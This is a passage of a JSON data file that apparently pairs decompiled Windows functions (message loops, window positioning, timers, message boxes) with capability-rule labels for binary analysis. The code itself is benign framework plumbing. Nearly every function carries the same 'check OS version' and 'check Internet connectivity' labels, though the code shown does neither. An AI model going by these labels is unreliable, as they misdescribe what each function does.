        "decompiled_code": "\nuint __fastcall fcn.0047b358(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x4ab084) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040eac8();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.00479f1c();\n        }\n        if (*param_2 == *0x4ab084) {\n            fcn.0047a59c();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "0047b3b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047b3b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x47b40d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00405664();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x47b414;\n    uStack24 = 0x47b40c;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 213
    },
    "0047bb68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047bb68(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00471334();\n    if (iVar2 != 0) {\n        return;\n    }\n    *0x4ab088 = 1;\n    fcn.0047b008();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.0047b1c4();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar3 = fcn.00466ca8();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 != 0) {\n            cVar1 = fcn.0047ddf4();\n            if (cVar1 == '\\0') {\n                uVar3 = fcn.00473b94(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n                uVar3 = fcn.00473b74(uVar3);\n                uVar3 = fcn.00466ca8(uVar3);\n                sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar3);\n                sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            }\n            else {\n                fcn.0047598c();\n            }\n            goto code_r0x0047bc2c;\n        }\n    }\n    fcn.0047a81c();\ncode_r0x0047bc2c:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "0047bc48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047bc48(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.00471334();\n    if (iVar2 == 0) {\n        return;\n    }\n    *0x4ab088 = 0;\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if (*(in_EAX + 0x44) == 0) goto code_r0x0047bd0f;\n    cVar1 = fcn.0047ddf4();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.00466ca8(9);\n        sub.user32.dll_ShowWindow(uVar3);\n        goto code_r0x0047bd0f;\n    }\n    if ((*(in_EAX + 0x5b) == '\\0') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\ncode_r0x0047bccb:\n        fcn.0047a81c();\n    }\n    else {\n        uVar3 = fcn.00466ca8();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 == 0) goto code_r0x0047bccb;\n        sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n    }\n    uVar4 = (***0x4a4d4c)(1, 0, 0, 0x40);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    uVar4 = (***0x4a4d4c)(0, iVar2);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar2);\ncode_r0x0047bd0f:\n    iVar2 = *(in_EAX + 0x44);\n    if (((iVar2 != 0) && (*(iVar2 + 0x273) == '\\x01')) && (*(iVar2 + 0x57) == '\\0')) {\n        fcn.0047598c();\n        fcn.00478784();\n    }\n    fcn.0047b068();\n    fcn.0047b1c4();\n    if (*(*0x4ab07c + 100) != 0) {\n        uVar3 = fcn.00466ca8();\n        sub.user32.dll_SetFocus(uVar3);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 682
    },
    "0047be34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0047be34(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "0047be7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0047be7c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x4ab07c + 0x6c) != 0)) &&\n       (*(*(*0x4ab07c + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 189
    },
    "0047bff4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0047bff4(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (*(in_EAX + 0x152) != 0) {\n        (**(in_EAX + 0x150))();\n    }\n    if (*(in_EAX + 0x44) != 0) {\n        uVar3 = fcn.00466ca8();\n        iVar4 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if ((iVar4 != 0) && (cVar1 = fcn.0040483c(),  cVar1 != '\\0')) {\n            uVar2 = 1;\n            goto code_r0x0047c051;\n        }\n    }\n    uVar2 = 0;\ncode_r0x0047c051:\n    return CONCAT14(uVar2, uVar2);\n}\n",
        "token_count": 212
    },
    "0047c0fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0047c0fc(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    char cStackY68;\n    int32_t *in_stack_ffffffc0;\n    \n    uVar4 = 0;\n    iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 0, param_1);\n    if (iVar3 == 0) goto code_r0x0047c206;\n    if (*param_2 == 0) {\ncode_r0x0047c12d:\n        bVar1 = false;\n    }\n    else {\n        iVar3 = sub.user32.dll_IsWindowUnicode();\n        if (iVar3 == 0) goto code_r0x0047c12d;\n        bVar1 = true;\n    }\n    in_stack_ffffffc0 = param_2;\n    if (bVar1) {\n        iVar3 = sub.user32.dll_PeekMessageW(param_2, 0, 0, 0, 1);\n    }\n    else {\n        iVar3 = sub.user32.dll_PeekMessageA(param_2, 0, 0, 0, 1);\n    }\n    if (iVar3 != 0) {\n        uVar4 = 1;\n        if (param_2[1] == 0x12) {\n            *(in_EAX + 0xa4) = 1;\n        }\n        else {\n            in_stack_ffffffc0 = in_stack_ffffffc0 & 0xffff00ff;\n            if (*(in_EAX + 0x102) != 0) {\n                (**(in_EAX + 0x100))();\n            }\n            cVar2 = fcn.0047d9a8();\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.0047bfc0();\n                if ((cVar2 == '\\0') && (in_stack_ffffffc0 >> 8 == '\\0')) {\n                    cVar2 = fcn.0047be7c();\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.0047becc();\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.0047be34();\n                            if (cVar2 == '\\0') {\n                                sub.user32.dll_TranslateMessage();\n                                cStackY68 = param_2;\n                                if (cStackY68 == '\\0') {\n                                    sub.user32.dll_DispatchMessageA();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                                else {\n                                    sub.user32.dll_DispatchMessageW();\n                                    in_stack_ffffffc0 = param_2;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0047c206:\n    return CONCAT44(in_stack_ffffffc0, uVar4);\n}\n",
        "token_count": 665
    },
    "0047c234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c234(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 0, &arg_8h);\n        }\n    }\n    else {\n        fcn.004195f0();\n        puVar1 = fcn.00402ef0();\n        *puVar1 = arg_8h;\n        puVar1[1] = arg_ch;\n        fcn.004194b8();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "0047c290": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c290(int32_t lParam, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0xac) == '\\0') {\n        if (*(in_EAX + 0x30) != 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x30), 0xb020, 1, &lParam);\n        }\n    }\n    else {\n        iVar2 = *(*(in_EAX + 0xb0) + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00419610();\n                if ((*piVar1 == lParam) && (arg_ch == piVar1[1])) {\n                    fcn.00402f0c();\n                    fcn.00419504();\n                    return;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0047c37c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047c37c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar2 != 0) {\n        uVar3 = sub.user32.dll_GetCapture(0x1f, 0, 0);\n        sub.user32.dll_SendMessageA(uVar3);\n    }\n    fcn.00402f74();\n    cVar1 = fcn.0047c320();\n    if (cVar1 == '\\0') {\n        uVar3 = fcn.00402f94();\n        fcn.00402f74(uVar3);\n        fcn.0040d930();\n    }\n    else {\n        fcn.00402f74();\n        cVar1 = fcn.0047c320();\n        if (cVar1 == '\\0') {\n            if (*(in_EAX + 0xea) == 0) {\n                fcn.00402f74();\n                fcn.0047c588();\n                return;\n            }\n            fcn.00402f74();\n            (**(in_EAX + 0xe8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0047c40c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c40c(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    int32_t lpRect;\n    uint *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hWnd;\n    uint var_ch;\n    uint lpCaption;\n    int32_t var_4h;\n    \n    iStack108 = 0x47c428;\n    var_4h = in_EAX;\n    iStack112 = fcn.0047d7bc();\n    iVar2 = iStack112;\n    if (iStack112 == 0) {\n        iVar2 = *(var_4h + 0x30);\n    }\n    iStack108 = 2;\n    uStack116 = 0x47c44b;\n    hWnd = iStack112;\n    var_18h = (***0x4a4e18)();\n    uStack116 = 2;\n    uStack120 = *(var_4h + 0x30);\n    puStack124 = 0x47c460;\n    var_1ch = (***0x4a4e18)();\n    if (var_18h != var_1ch) {\n        var_48h = 0x28;\n        puStack124 = &fcn.0047c40c::var_48h;\n        iStack128 = var_18h;\n        iStack132 = 0x47c483;\n        (***0x4a4d20)();\n        var_54h = &fcn.0047c40c::lpRect;\n        lpRect = *(var_4h + 0x30);\n        sub.user32.dll_GetWindowRect();\n        iStack108 = var_38h - var_40h >> 1;\n        if (iStack108 < 0) {\n            iStack108 = iStack108 + ((var_38h - var_40h & 1U) != 0);\n        }\n        iStack108 = iStack108 + var_40h;\n        iStack112 = var_3ch - var_44h >> 1;\n        if (iStack112 < 0) {\n            iStack112 = iStack112 + ((var_3ch - var_44h & 1U) != 0);\n        }\n        iStack112 = iStack112 + var_44h;\n        uStack116 = 0;\n        uStack120 = *(var_4h + 0x30);\n        puStack124 = 0x47c4cb;\n        sub.user32.dll_SetWindowPos();\n    }\n    puStack124 = 0x47c4d3;\n    var_14h = fcn.004714f8();\n    puStack124 = 0x47c4db;\n    var_20h = fcn.00471354();\n    puStack124 = 0x47c4e6;\n    cVar1 = fcn.0047b328();\n    if (cVar1 != '\\0') {\n        arg_8h = arg_8h | 0x100000;\n    }\n    iStack128 = 0x47c574;\n    iStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    var_ch = sub.user32.dll_MessageBoxA_1();\n    *in_FS_OFFSET = iVar2;\n    if (var_18h != var_1ch) {\n        iVar2 = var_4ch - var_54h >> 1;\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + ((var_4ch - var_54h & 1U) != 0);\n        }\n        iVar3 = var_50h - lpRect >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((var_50h - lpRect & 1U) != 0);\n        }\n        sub.user32.dll_SetWindowPos(*(var_4h + 0x30), 0, iVar3 + lpRect, iVar2 + var_54h, 0, 0, 0x1d, 0x47c57b, arg_8h);\n    }\n    fcn.004715bc();\n    sub.user32.dll_SetActiveWindow(hWnd);\n    fcn.0047135c();\n    return;\n}\n",
        "token_count": 1118
    },
    "0047c588": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0047c5c1)\n// WARNING: Removing unreachable block (ram,0x0047c5e8)\n\nvoid fcn.0047c588(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x47c643;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee0;\n    fcn.00405504();\n    arg_8h = 0x10;\n    fcn.0047bdb4();\n    uVar1 = fcn.004058fc();\n    fcn.004058fc(uVar1);\n    fcn.0047c40c(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    uStack284 = 0x47c64a;\n    uStack288 = 0x47c63a;\n    fcn.0040546c();\n    uStack288 = 0x47c642;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 291
    },
    "0047c660": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0047c660(char param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    char cStack28;\n    uint uStack24;\n    \n    iVar4 = 0;\n    uStack24 = CONCAT31(uStack24._1_3_, 1);\n    arg_8h = &uStack24;\n    uVar3 = fcn.0047c788(arg_8h);\n    cStack28 = param_1;\n    if (uVar3 == '\\0') {\n        iVar4 = *(*0x4ab07c + 0x68);\n        if ((iVar4 != 0) && ((*(iVar4 + 0x1c) & 0x10) != 0)) {\n            cStack28 = '\\0';\n        }\n        if ((((iVar4 != 0) && (iVar2 = fcn.00466ec4(),  iVar2 == -1)) && (*(iVar4 + 0x57) == '\\0')) &&\n           (*(iVar4 + 0x268) == 0)) {\n            cStack28 = '\\0';\n        }\n    }\n    if (cStack28 != '\\0') {\n        if (((iVar4 != 0) && (cVar1 = fcn.00466fb4(),  cVar1 != '\\0')) && (*(iVar4 + 0x284) != 0)) {\n            uStack24 = fcn.00466ca8();\n            cVar1 = fcn.0047ce24();\n            if (cVar1 == '\\0') {\n                return uVar3;\n            }\n            uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            return uVar3;\n        }\n        if (*(in_EAX + 0x50) == 0) {\n            if (*(in_EAX + 0xac) == '\\0') {\n                sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01f, param_2 & 0xffff, arg_8h);\n            }\n        }\n        else {\n            uStack24 = *(in_EAX + 0x30);\n            if (*(in_EAX + 0x44) != 0) {\n                uStack24 = fcn.00466ca8();\n            }\n            cVar1 = fcn.0047ce24();\n            if (cVar1 != '\\0') {\n                uVar3 = (**(**(in_EAX + 0x4c) + 0x20))(arg_8h, param_2);\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 619
    },
    "0047c788": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0047c788(uchar *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar2 = 0;\n    *arg_8h = 1;\n    iVar3 = 0;\n    if (*(*0x4ab07c + 100) != 0) {\n        iVar3 = fcn.00471968();\n        if ((iVar3 != 0) && (*(iVar3 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar3 + 0x2f0))(arg_8h);\n        }\n    }\n    if (uVar2 == '\\0') {\n        iVar1 = *(*0x4ab07c + 0x68);\n        if ((((iVar1 != 0) && (iVar3 != iVar1)) && (iVar1 != 0)) && (*(iVar1 + 0x2f2) != 0)) {\n            uVar2 = (**(iVar1 + 0x2f0))(arg_8h);\n        }\n        if ((uVar2 == '\\0') && (*(in_EAX + 0x11a) != 0)) {\n            uVar2 = (**(in_EAX + 0x118))(arg_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 321
    },
    "0047c854": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047c854(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.0047c854::var_1h + 1;\n    uStack32 = 0x47c8d2;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.0047c854::var_1h;\n    fcn.004058fc();\n    fcn.0047c788(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0047ce24(),  cVar1 != '\\0')) {\n        fcn.0047d780();\n        (**(**(in_EAX + 0x4c) + 0xc))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x47c8d9;\n    iStack36 = 0x47c8d1;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 319
    },
    "0047c8e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047c8e4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack28 = &fcn.0047c8e4::var_1h + 1;\n    uStack32 = 0x47c95b;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.0047c8e4::var_1h;\n    fcn.0047c788(arg_8h);\n    if ((var_1h != '\\0') && (cVar1 = fcn.0047ce24(),  cVar1 != '\\0')) {\n        fcn.0047d780();\n        (**(**(in_EAX + 0x4c) + 0x10))();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x47c962;\n    iStack36 = 0x47c95a;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 314
    },
    "0047ca4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047ca4c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x4ab078 != 0) {\n        uStack24 = 0x47ca91;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        uVar1 = 0;\n        sub.user32.dll_KillTimer(0, *0x4ab0a4);\n        *0x4ab0a4 = 0;\n        fcn.0047c9c4();\n        *in_FS_OFFSET = uVar1;\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "0047cab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047cab4(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x47cc01;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x47cade;\n    fcn.0047ca28();\n    if ((*(in_EAX + 0x88) != '\\0') && (*(in_EAX + 0x48) == 0)) {\n        puStack48 = 0x47cafd;\n        fcn.0047d07c();\n    }\n    puStack48 = 0x47cb07;\n    fcn.0047a5a8();\n    puStack48 = 0x47cb12;\n    fcn.0045bc58();\n    puStack48 = 0x47cb1f;\n    fcn.0047ccac();\n    bVar1 = true;\n    uStack52 = 0x47cba8;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    if (*(in_EAX + 0x12a) != 0) {\n        puStack48 = &stack0xfffffffc;\n        (**(in_EAX + 0x128))();\n    }\n    if (*(in_EAX + 0xc0) < 1) {\n        fcn.0047c9c4();\n    }\n    else if ((*0x4ab0a4 == 0) &&\n            (*0x4ab0a4 = sub.user32.dll_SetTimer(0, 0, *(in_EAX + 0xc0), fcn.0047ca4c),  *0x4ab0a4 == 0)) {\n        fcn.0047c9c4();\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x47cbc2;\n    iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar3 == **0x4a5170) {\n        puStack48 = 0x47cbd3;\n        cVar2 = fcn.0041f498();\n        if (cVar2 != '\\0') {\n            bVar1 = false;\n        }\n    }\n    if (bVar1) {\n        puStack48 = 0x47cbe6;\n        sub.user32.dll_WaitMessage();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x47cc08;\n    uStack40 = 0x47cc00;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 680
    },
    "0047ccac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
